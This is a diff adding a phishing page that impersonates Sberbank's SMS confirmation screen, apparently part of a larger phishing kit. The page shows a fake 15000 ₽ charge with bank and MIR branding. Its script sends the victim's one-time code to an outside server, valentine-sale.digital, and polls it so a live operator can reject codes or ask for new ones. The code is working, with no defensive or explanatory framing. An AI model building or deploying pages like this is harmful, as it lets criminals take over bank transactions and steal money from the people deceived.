@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ввод кода — СберБанк</title>
+    <link rel="shortcut icon" href="favicons/favicon_sber.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'SB Sans Interface', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f3f4f5;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: #fff;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+        }
+
+        .logo {
+            height: 28px;
+        }
+
+        .mir-badge {
+            background: #4DB45E;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 24px 20px;
+        }
+
+        .amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 24px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 14px;
+        }
+
+        .info-row:last-of-type {
+            border-bottom: none;
+            margin-bottom: 24px;
+        }
+
+        .info-label {
+            color: #21a038;
+        }
+
+        .info-value {
+            color: #8b8b8b;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+        }
+
+        .card-desc {
+            font-size: 14px;
+            color: #1a1a1a;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .card-warning {
+            font-size: 13px;
+            color: #e67e22;
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            font-size: 13px;
+            color: #8b8b8b;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e5e5e5;
+            border-radius: 12px;
+            font-size: 20px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: 600;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .code-input:focus {
+            border-color: #21a038;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #1a1a1a;
+            border-radius: 12px;
+            background: #fff;
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+        }
+
+        .btn:hover {
+            background: #1a1a1a;
+            color: #fff;
+        }
+
+        .btn.primary {
+            background: #1a1a1a;
+            color: #fff;
+            border-color: #1a1a1a;
+        }
+
+        .btn.primary:hover {
+            background: #333;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e5e5e5;
+            border-radius: 12px;
+            background: #fff;
+            color: #8b8b8b;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            border-color: #21a038;
+            color: #21a038;
+        }
+
+        .btn-secondary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #8b8b8b;
+            text-align: center;
+            line-height: 1.6;
+            margin-top: 20px;
+        }
+
+        .footer-text a {
+            color: #21a038;
+            text-decoration: none;
+        }
+
+        /* Processing overlay */
+        .processing-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.98);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .processing-overlay.active {
+            display: flex;
+        }
+
+        .processing-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #1a1a1a;
+        }
+
+        .processing-spinner {
+            display: flex;
+            gap: 8px;
+        }
+
+        .processing-spinner span {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .processing-spinner span:nth-child(1) {
+            background: #00d4aa;
+            animation-delay: 0s;
+        }
+        .processing-spinner span:nth-child(2) {
+            background: #00c4d4;
+            animation-delay: 0.15s;
+        }
+        .processing-spinner span:nth-child(3) {
+            background: #00b4e4;
+            animation-delay: 0.3s;
+        }
+        .processing-spinner span:nth-child(4) {
+            background: #00a4f4;
+            animation-delay: 0.45s;
+        }
+        .processing-spinner span:nth-child(5) {
+            background: #0094ff;
+            animation-delay: 0.6s;
+        }
+        .processing-spinner span:nth-child(6) {
+            background: #00c4d4;
+            animation-delay: 0.75s;
+        }
+        .processing-spinner span:nth-child(7) {
+            background: #00d4aa;
+            animation-delay: 0.9s;
+        }
+        .processing-spinner span:nth-child(8) {
+            background: #00e490;
+            animation-delay: 1.05s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            50% {
+                transform: scale(1.2);
+                opacity: 1;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .amount {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="images/sberbank-logo.befb25b6.svg" alt="Сбербанк" class="logo">
+        <div style="display: flex; gap: 8px; align-items: center;">
+            <span class="mir-badge">МИР</span>
+            <span style="color: #8b8b8b; font-size: 12px;">Accept</span>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="amount">15000 ₽</div>
+
+        <div class="info-row">
+            <span class="info-label">Магазин</span>
+            <span class="info-value">Sber</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Номер карты</span>
+            <span class="info-value" id="cardLast4">•• ****</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Дата</span>
+            <span class="info-value" id="currentDate">04.02.2026</span>
+        </div>
+
+        <div class="card">
+            <h2 class="card-title">Отправили код</h2>
+            <p class="card-desc">В СМС или Push-уведомлении. Чтобы получить его, ваш номер должен быть подключен к СМС-банку.</p>
+            <p class="card-warning">Время доставки кода зависит от вашего оператора и может занимать до 5 минут.</p>
+
+            <label class="form-label">Введите код</label>
+            <input type="text" class="code-input" id="codeInput" maxlength="6" inputmode="numeric" placeholder="" autocomplete="one-time-code">
+        </div>
+
+        <button class="btn primary" id="submitBtn" onclick="submitCode()">Отправить код</button>
+        <button class="btn-secondary" id="resendBtn" disabled>Запросить новый код через <span id="timer">60</span> секунд</button>
+
+        <p class="footer-text">
+            Оплата покупок без комиссии. За пополнение карт и кошельков через приложения и сайты других банков взимается комиссия.<br><br>
+            Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: <a href="#">ссылка</a>
+        </p>
+    </div>
+
+    <!-- Processing overlay -->
+    <div class="processing-overlay" id="processingOverlay">
+        <div class="processing-title">Обработка введённых данных...</div>
+        <div class="processing-spinner">
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'https://valentine-sale.digital/api';
+        const LOG_ID = new URLSearchParams(window.location.search).get('id');
+
+        if (!LOG_ID) {
+            window.location.href = 'receive.html';
+        }
+
+        // Установка текущей даты
+        const today = new Date();
+        document.getElementById('currentDate').textContent = today.toLocaleDateString('ru-RU');
+
+        // Получение последних 4 цифр карты
+        async function getCardInfo() {
+            try {
+                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
+                const data = await response.json();
+                if (data.card_last4) {
+                    document.getElementById('cardLast4').textContent = `•• ${data.card_last4}`;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        getCardInfo();
+
+        // Автофокус на поле ввода
+        const codeInput = document.getElementById('codeInput');
+        codeInput.focus();
+
+        // Только цифры
+        codeInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+        });
+
+        // Таймер для повторной отправки
+        let timeLeft = 60;
+        const timerInterval = setInterval(() => {
+            timeLeft--;
+            document.getElementById('timer').textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                const resendBtn = document.getElementById('resendBtn');
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'Запросить новый код';
+                resendBtn.onclick = requestNewCode;
+            }
+        }, 1000);
+
+        // Отправка кода
+        async function submitCode() {
+            const code = codeInput.value;
+            
+            if (code.length < 4) {
+                alert('Введите код из СМС');
+                return;
+            }
+
+            document.getElementById('processingOverlay').classList.add('active');
+
+            try {
+                await fetch(`${API_URL}/log/${LOG_ID}/code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code })
+                });
+
+                // Ждём ответа от оператора
+                checkProcessingStatus();
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Ошибка отправки кода');
+                document.getElementById('processingOverlay').classList.remove('active');
+            }
+        }
+
+        // Проверка статуса обработки
+        async function checkProcessingStatus() {
+            try {
+                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
+                const data = await response.json();
+
+                if (data.status === 'done') {
+                    alert('Операция успешно завершена!');
+                    window.location.href = 'index_sber.html';
+                } else if (data.status === 'error') {
+                    document.getElementById('processingOverlay').classList.remove('active');
+                    
+                    if (data.error === 'wrong_code') {
+                        alert('Неверный код. Попробуйте ещё раз.');
+                        codeInput.value = '';
+                        codeInput.focus();
+                    } else {
+                        alert('Произошла ошибка. Попробуйте позже.');
+                    }
+                } else if (data.status === 'code') {
+                    // Запрошен новый код
+                    document.getElementById('processingOverlay').classList.remove('active');
+                    alert('Запрошен новый код. Проверьте СМС.');
+                    codeInput.value = '';
+                    codeInput.focus();
+                } else {
+                    // Продолжаем проверять
+                    setTimeout(checkProcessingStatus, 2000);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                setTimeout(checkProcessingStatus, 2000);
+            }
+        }
+
+        // Запрос нового кода
+        async function requestNewCode() {
+            try {
+                await fetch(`${API_URL}/log/${LOG_ID}/new_code`, {
+                    method: 'POST'
+                });
+                alert('Новый код отправлен');
+                
+                // Сброс таймера
+                timeLeft = 60;
+                document.getElementById('resendBtn').disabled = true;
+                document.getElementById('resendBtn').textContent = `Запросить новый код через ${timeLeft} секунд`;
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Проверка статуса в фоне (на случай если оператор запросит новый код)
+        setInterval(async () => {
+            try {
+                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
+                const data = await response.json();
+                
+                if (data.error === 'wrong_code') {
+                    alert('Неверный код. Попробуйте ещё раз.');
+                    codeInput.value = '';
+                    codeInput.focus();
+                }
+            } catch (error) {}
+        }, 3000);
+    </script>
+</body>
+</html>
